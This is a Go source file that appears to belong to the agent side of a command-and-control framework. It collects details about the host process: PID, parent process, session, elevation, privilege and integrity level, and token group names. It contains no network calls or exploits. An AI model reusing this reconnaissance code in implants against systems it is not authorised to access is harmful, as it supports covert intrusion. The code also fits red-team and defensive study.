//go:build windows

package core

import (
	"os"
	"strings"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
	"tornadoc2/agent/protocol"
)

func fillIdentityExtra(id *protocol.Identity) {
	id.PID = os.Getpid()

	pid, name := parentProcess(uint32(id.PID))
	id.ParentPID = int(pid)
	id.ParentName = name

	var sid uint32
	if err := windows.ProcessIdToSessionId(uint32(id.PID), &sid); err == nil {
		id.SessionID = int(sid)
	}

	tok := windows.GetCurrentThreadEffectiveToken()
	id.Elevated = tok.IsElevated()

	userName := strings.ToLower(id.Username)
	system := userName == "system" || isWellKnownSid(tok, 18)
	admin := isGroupSid(tok, 544)
	switch {
	case system:
		id.Privilege = "system"
		id.Integrity = "system"
	case admin || id.Elevated:
		id.Privilege = "admin"
		id.Integrity = "high"
	default:
		id.Privilege = "user"
		id.Integrity = "medium"
	}

	if groups, err := tok.GetTokenGroups(); err == nil {
		for i := uint32(0); i < groups.GroupCount && len(id.Groups) < 24; i++ {
			g := &groups.Groups[i]
			name, _, _, err := g.Sid.LookupAccount("")
			if err == nil && name != "" {
				id.Groups = append(id.Groups, name)
			}
		}
	}
}

func isWellKnownSid(tok windows.Token, rid uint32) bool {
	u, err := tok.GetTokenUser()
	if err != nil {
		return false
	}
	return u.User.Sid.SubAuthority(uint32(u.User.Sid.SubAuthorityCount()-1)) == rid
}

func isGroupSid(tok windows.Token, rid uint32) bool {
	groups, err := tok.GetTokenGroups()
	if err != nil {
		return false
	}
	for i := uint32(0); i < groups.GroupCount; i++ {
		g := groups.Groups[i]
		if g.Sid == nil || g.Sid.SubAuthorityCount() == 0 {
			continue
		}
		if g.Sid.SubAuthority(uint32(g.Sid.SubAuthorityCount()-1)) == rid {
			return true
		}
	}
	return false
}

func parentProcess(pid uint32) (uint32, string) {
	snap, err := windows.CreateToolhelp32Snapshot(
		windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, ""
	}
	defer windows.CloseHandle(snap)
	var e windows.ProcessEntry32
	e.Size = uint32(unsafe.Sizeof(e))
	if err := windows.Process32First(snap, &e); err != nil {
		return 0, ""
	}
	for {
		if e.ProcessID == pid {
			return e.ParentProcessID,
				windows.UTF16ToString(e.ExeFile[:])
		}
		if err := windows.Process32Next(snap, &e); err != nil {
			return 0, ""
		}
	}
}

var _ = syscall.Handle(0)
